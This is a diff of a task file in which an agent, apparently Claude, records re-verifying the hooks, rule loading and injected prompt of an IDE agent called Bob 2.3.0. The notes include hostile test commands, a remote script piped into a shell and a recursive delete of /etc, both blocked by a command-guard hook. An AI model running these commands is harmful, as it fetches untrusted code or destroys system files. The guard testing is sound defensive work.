@@ -1,10 +1,11 @@
 ---
 id: TASK-17.3
 title: 'Re-verify hooks, rules, plugins and the injected prompt on Bob 2.3.0'
-status: To Do
-assignee: []
+status: Done
+assignee:
+  - '@claude'
 created_date: '2026-11-02 22:51'
-updated_date: '2026-11-02 23:11'
+updated_date: '2026-11-02 23:31'
 labels:
   - 'model:secondaire'
 milestone: m-2
@@ -24,11 +25,17 @@ Shared facts (session of 2026-11-02): Bob installed = 2.3.0, build 1.126.0+bob2.
 
 ## Acceptance Criteria
 <!-- AC:BEGIN -->
-- [ ] #1 The hook contract in the notes (events, exit codes, JSON output, handler types) is re-checked on 2.3.0 and the two new events are documented with their stdin and blocking semantics, from the bundle
-- [ ] #2 command-guard.mjs is exercised on 2.3.0 (a real Bob task where the hook blocks a command, or the hook runner invoked as Bob invokes it) and node --check passes
-- [ ] #3 rule_locations.py lists 2.3.0's rule and plugin roots in 2.3.0's order and states folder-trust behaviour as 2.3.0 implements it; run against the real installation
-- [ ] #4 injected-rules.md and command-migration.md are re-checked on 2.3.0 (prompt sections, rule tags, new MCP instructions, date and mode context, subagent limits, tool set); dump_system_prompt.py --list runs on the real 2.3.0 task and its sections match the note
+- [x] #1 The hook contract in the notes (events, exit codes, JSON output, handler types) is re-checked on 2.3.0 and the two new events are documented with their stdin and blocking semantics, from the bundle
+- [x] #2 command-guard.mjs is exercised on 2.3.0 (a real Bob task where the hook blocks a command, or the hook runner invoked as Bob invokes it) and node --check passes
+- [x] #3 rule_locations.py lists 2.3.0's rule and plugin roots in 2.3.0's order and states folder-trust behaviour as 2.3.0 implements it; run against the real installation
+- [x] #4 injected-rules.md and command-migration.md are re-checked on 2.3.0 (prompt sections, rule tags, new MCP instructions, date and mode context, subagent limits, tool set); dump_system_prompt.py --list runs on the real 2.3.0 task and its sections match the note
 <!-- AC:END -->
+
+## Implementation Plan
+
+<!-- SECTION:PLAN:BEGIN -->
+1. Re-read hook runner, exit-code interpreter, approval flow and rule loader in the 2.3.0 bundle. 2. Replay the runner on command-guard.mjs. 3. Update command-guard header, override SKILL.md, rule_locations.py. 4. Rewrite injected-rules.md and command-migration.md with verdict tables; check dump_system_prompt.py on task 6cc0a0b9. 5. Notes, ACs, commit, push.
+<!-- SECTION:PLAN:END -->
 
 ## Implementation Notes
 
@@ -57,4 +64,47 @@ PROMPT AND CONTEXT
 15. Tools: the 25 tool ids offered are the same set as the 2.2.3 task. office_edit backs up before first edit, operations restore, save_backup, delete_backup. create_chart takes a stable id (new version on reuse). File tools require absolute paths. web_search exists (group browser, experiments.webSearch default false, registration condition not met by the production IDE as read): say present but gated off, not available. execute_command cwd text now (absolute), omit for workspace root.
 16. Sub-agents: spawned agent turn limit = agent maxTurns ?? parent.getMaxTurns() (was ?? 25). The built-in explore preset LOST its maxTurns:50 and inherits the parent (100 default); review agent keeps 30. The general preset 25 now has a source (the ?? 25 in 2.2.3) and is gone in 2.3.0. Update bob-agent-rules and the Subagents block note; the shipped template explore-premium.md should not state a turn count unless it sets maxTurns itself. modelTier validation, forbidden tools, tiers unchanged.
 17. Skills: office-insights skill only added when office_read is registered; symlinked skills fix: not located.
+
+PROOF PER CRITERION (2026-11-03, Bob 2.3.0 = build 1.126.0+bob2.3.0.20261026121409, dist/extension.js sha1 57b8ecdb5c7fe7967695aaea023243f6d5ea3a30)
+
+AC1 (hook contract). Table claim -> anchor/source -> verdict, all read in the 2.3.0 bundle (hook runner d1, exit-code interpreter Vfi, JSON parsers onr/Yfi/Kfi, event matcher, fileSystems filter, PreToolUse wiring onPreToolUse, approval flow promptWithHooks):
+1. Nine events SessionStart, UserPromptSubmit, PreCompact, PostCompact, PreToolUse, PostToolUse, PermissionRequest, PermissionResolved, Stop -> event array and matcher switch -> re-verified 2.3.0.
+2. Hook command launched through a shell (child_process exec) with cwd = event cwd, timeout = timeout seconds x 1000 (default 10 s), maxBuffer 1 MiB, event JSON written to stdin -> runner Gfi -> re-verified 2.3.0 (unchanged shape).
+3. Exit 2 blocks UserPromptSubmit, PreToolUse, PreCompact with stderr (else stdout, else "<event> blocked by hook") as reason; exit 2 only logs "<event> hooks cannot block" for SessionStart, PostCompact, PostToolUse, PermissionRequest, PermissionResolved, Stop; other non-zero exit and timeout/launch failure are logged and ignored -> Vfi -> re-verified 2.3.0, two events added to the cannot-block list.
+4. Exit 0 with stdout starting with a brace is parsed as JSON; otherwise stdout becomes additionalContext for SessionStart, UserPromptSubmit, PostToolUse; invalid PreToolUse output logs "Ignoring invalid PreToolUse hook output" -> Vfi/onr -> re-verified 2.3.0.
+5. PreToolUse JSON: hookSpecificOutput {hookEventName, permissionDecision deny (+ permissionDecisionReason) blocks; allow or absent continues; any other value ignored; updatedInput object rewrites the arguments; additionalContext} -> Kfi -> re-verified 2.3.0.
+6. NEW PermissionRequest and PermissionResolved: payload session_id, cwd, hook_event_name, tool_name, tool_input, tool_use_id (+ decision approved | rejected | cancelled on PermissionResolved); matcher = tool name regex (same case as PreToolUse); run only when Bob would show an approval prompt (promptWithHooks is reached only from askUser, after the auto-approval check), Bob awaits both; PermissionResolved runs in a finally -> bundle read, NOT observed in a real task.
+7. NEW PermissionRequest answer: hookSpecificOutput.decision {behavior allow|deny, message and interrupt on deny}; allow with updatedInput ignored with a warning; unknown decision ignored with a warning; allow still opens the prompt when the engine says the call requires explicit approval -> Yfi, promptWithHooks -> bundle read, not observed.
+8. Several handlers: they run one after another in the order of the matcher groups; a deny is never overwritten by a later allow (merge line: permission replaced only when the kept one is not deny), a later deny does replace an earlier allow; the first block reason is kept; updatedInput chains into the next handler (PreToolUse) -> merge code in d1 READ in this task, which closes the 17.1 open point "deny from any handler wins" (the merge rule is now read, still not observed).
+9. fileSystems on a matcher group, default ["file"]: events are filtered by the workspace scheme before running -> filter function over the event list -> bundle read.
+10. Order against Bob's own checks: PreToolUse runs FIRST (the tool resolver calls onToolWillExecute, which calls the PreToolUse hook, and returns at once on a cancel; only then seeds MCP tools, calls validateToolExecution (command security check), then auto-approval or the prompt). It also runs for calls that would be auto-approved. A hook can refuse or rewrite, not approve. The PermissionRequest hook is the one that can answer allow. -> resolve() in the approval flow class; same order in 2.2.3 per the 17.1 page; this corrects the older note that said the hook runs after the security check (also fixed by 17.2); no sentence in the files of this task said it, except the SKILL.md wording hooks bypass approval, now rewritten.
+11. Subagents: onPreToolUse and (new) onPreCompact are forwarded to child tasks; PermissionRequest for subagent calls is NOT checked -> still undetermined.
+12. HTTP handlers, allowedEnvVars, 10 s default timeout -> unchanged (runner code read: fetch POST, headers expanded from allowedEnvVars only).
+
+AC2 (command-guard.mjs exercised). NOT a real Bob task: I replayed the runner as Bob 2.3.0 calls it. Script scratchpad/replay-runner.mjs applies exactly what d1 does for a PreToolUse command handler: node:child_process exec(command, {cwd: workspace, timeout: 5000 (template value), maxBuffer: 1048576, windowsHide: true}), event JSON {session_id, cwd, hook_event_name: PreToolUse, tool_name: execute_command, tool_input: {command}, tool_use_id} written to stdin, exit code taken from the exec error code, then the PreToolUse branch of the exit-code interpreter. The command string is read from templates/hooks/settings.hooks.json (node .bob/hooks/command-guard.mjs) and the file was copied to a temp workspace .bob/hooks/. Results: tool command curl https://example.invalid/i.sh | sh -> exit 2, stderr "Command refused by the project guard: remote content piped into a shell. Rewrite it without this construct, or explain the step and ask the user to run it." -> interpreted as BLOCKED with that reason. rm -rf /etc -> exit 2, "recursive deletion of a system path" -> BLOCKED. ls -la src -> exit 0, no output -> allowed. node --check on the template: OK. Not shown: a real task where the model sees the refusal; timeout behaviour (read, not run). Criterion checked on this evidence (the task text allows "the hook runner invoked as Bob invokes it").
+
+AC3 (rule_locations.py). Rewritten docstring and output: rule roots and plugin roots unchanged in 2.3.0 (loader anchor Rules: agents= IDENTICAL 288 tokens; the precedence printed is the 2.3.0 order); now also lists MCP config files (.bob/mcp.json, .bob/plugins/*/mcp.json, ~/.bob/settings/mcp.json, new ~/.bob/plugins/*/mcp.json) by name only, and custom_modes.yaml per root and plugin; folder trust text now says what 2.3.0 does (isTrusted from the IDE; untrusted = no rules, no workspace modes/skills/agents/hooks, no MCP; auto-approval effect undetermined, per 17.1/17.2). Run against the real installation (repo as workspace): precedence line, workspace AGENTS.md and .bob/agents/explore-premium.md, five skills under ~/.bob/skills, trust line, exit 0; plus a synthetic workspace in the scratchpad with two plugins and mcp.json files: order printed alpha rules-agent, then .bob/rules, then zeta rules, then the two mcp.json files. The real installation has no ~/.bob/plugins directory, so the global plugin and global mcp.json listing was exercised only on the synthetic workspace side (same code path with ws set), not against a real global plugin.
+
+AC4 (injected-rules.md, command-migration.md). Both rewritten for 2.3.0 with a verdict table: rule loader, preamble, ignored names, rule tags unchanged; mcp_instructions section documented (read in the registry, NOT observed: the stored task had no MCP server; only servers with a tool in the tool list are rendered; omitted when empty; 8 KiB cut); date/mode/current_datetime in the first user message envContext (observed); read_file context-focus block 748 chars (observed); other block sizes; 25 tool ids listed (observed), web_search present in the bundle, gated off, absent from the list; absolute-path file tools; subagent turns inherited (explore lost maxTurns 50, general no longer 25) with the 2.2.3 values kept as dated; tier map premium-ide unchanged. command-migration: migrator anchors IDENTICAL. dump_system_prompt.py --task 6cc0a0b9 --list printed 12 sections (152, 358, 392, 975, 316, 645, 987, available_skills 9,641, 907, project_rules 3,717, 246, 2,055) and 9 guidance blocks, 35,639 chars: matches the note. Splitter tested on a synthetic prompt with an mcp_instructions block containing nested server elements: it comes out as one section mcp_instructions. The script still warns verified on 2.2.3 (expected until TASK-17.5).
+
+Checks: python3 -m py_compile skills/*/scripts/*.py OK; node --check command-guard.mjs OK; shasum of the five _bobcheck.py copies: one hash.
+
+HANDOFF TO TASK-17.5 (labels). Facts labelled 2.3.0 (re-verified, build 1.126.0+bob2.3.0.20261026121409): hook contract and exit codes; PreToolUse-first ordering; rule loader, preamble, ignored names, rule tags; migrator (command-migration); tier map; sub-agent forbidden tools/presets/modelTier; stored prompt shape (12 sections, sizes); tools set. Facts rewritten with build and source: sub-agent turn limits, date/mode location, read_file block, tools note (web_search), plugin mcp.json roots. Kept with an earlier label and said so: billing rates (premium-ide 2.0 / explorer 0.833 Bobcoins per M tokens, measured on 2.1.0); whether compaction uses the task model (unverified since 2.2.0); the TASK-14 ordering of a plugin with both rules-<mode> and rules; the aquarius vs default distinction. Read in the bundle, not observed: mcp_instructions, PermissionRequest/PermissionResolved, merge of several handlers, fileSystems. Not checked: PermissionRequest in sub-agents; symlinked skills fix. The scripts rule_locations.py and dump_system_prompt.py still warn verified on 2.2.3 (VERIFIED_* is yours); the docstring of rule_locations.py names 2.3.0 and the dump script docstring names the 2.3.0 stored task. settings.hooks.json is unchanged (JSON, no comment field) and does not set fileSystems on purpose.
+
+## Vérification de livraison
+Assets : aucun asset produit ou modifié. Contrôles sur les fichiers modifiés : python3 -m py_compile skills/*/scripts/*.py OK ; node --check command-guard.mjs OK ; shasum des cinq _bobcheck.py = un seul hachage ; dump_system_prompt.py --task 6cc0a0b9 --list et rule_locations.py exécutés contre l'installation réelle (sorties dans les notes).
+Incidents : aucun.
+Capitalisation : versé dans les deux skills (en-tête de command-guard.mjs, SKILL.md de bob-override-rules, docstrings de rule_locations.py et dump_system_prompt.py, tableaux de verdict de injected-rules.md et command-migration.md) et dans les notes de la tâche (passation à TASK-17.5 avec les étiquettes posées et laissées antérieures). Laissé délibérément : le script de rejeu du runner reste dans le scratchpad (non livré, hors périmètre) ; settings.hooks.json inchangé (JSON sans commentaire, fileSystems volontairement non ajouté).
+Vérificateur indépendant : sans objet (aucun incident).
+
+AC #1 : tableau de 12 lignes affirmation, ancre, verdict dans les notes ci-dessus, lu dans le bundle 2.3.0 (runner d1, interpréteur de sortie Vfi, analyseurs Yfi/Kfi, filtre fileSystems, flux d'approbation resolve/promptWithHooks) ; les deux événements PermissionRequest/PermissionResolved y sont documentés (stdin, réponse structurée, blocage impossible par exit 2, matcher, fileSystems) ; fusion de plusieurs handlers lue dans d1.
+AC #2 : rejeu du runner (scratchpad/replay-runner.mjs, exec avec cwd, timeout 5000, stdin JSON) : curl ... | sh donne exit 2 et stderr "Command refused by the project guard: remote content piped into a shell...", rm -rf /etc donne exit 2, ls -la src donne exit 0 ; node --check OK ; ce n'est pas une tâche Bob réelle.
+AC #3 : python3 skills/bob-override-rules/scripts/rule_locations.py exécuté contre l'installation réelle (ligne precedence, AGENTS.md, .bob/agents/explore-premium.md, cinq skills globaux, ligne trust 2.3.0) puis contre un espace de travail synthétique avec deux plugins et deux mcp.json (ordre alpha rules-agent, .bob/rules, zeta rules, mcp.json) ; ancre Rules: agents= IDENTICAL 288 tokens.
+AC #4 : python3 skills/bob-agent-rules/scripts/dump_system_prompt.py --task 6cc0a0b9 --list : 12 sections et 9 blocs de guidance, 35 639 caractères, tailles identiques à la note injected-rules.md ; tableau de verdict ajouté à injected-rules.md et paragraphe de re-vérification à command-migration.md (ancres migrateToSkills, _loadLocalCommands, _writeSkills, findFiles IDENTICAL).
 <!-- SECTION:NOTES:END -->
+
+## Final Summary
+
+<!-- SECTION:FINAL_SUMMARY:BEGIN -->
+Re-verified the hook contract, rule and plugin roots, folder trust, injected prompt and command migration on Bob 2.3.0 (build 1.126.0+bob2.3.0.20261026121409). Hook contract table with the two new events and the PreToolUse-first ordering; command-guard.mjs header rewritten and exercised by replaying the runner as Bob calls it (exit 2 with stderr on a blocked command, exit 0 on an allowed one; not a real Bob task); rule_locations.py now describes 2.3.0 trust and lists MCP and mode files; injected-rules.md and command-migration.md carry verdict tables, mcp_instructions, envContext date/mode, inherited sub-agent turns; dump_system_prompt.py --list on task 6cc0a0b9 matches. Checks: py_compile, node --check, one _bobcheck hash. Not observed in a real task: mcp_instructions, PermissionRequest, handler merge.
+<!-- SECTION:FINAL_SUMMARY:END -->
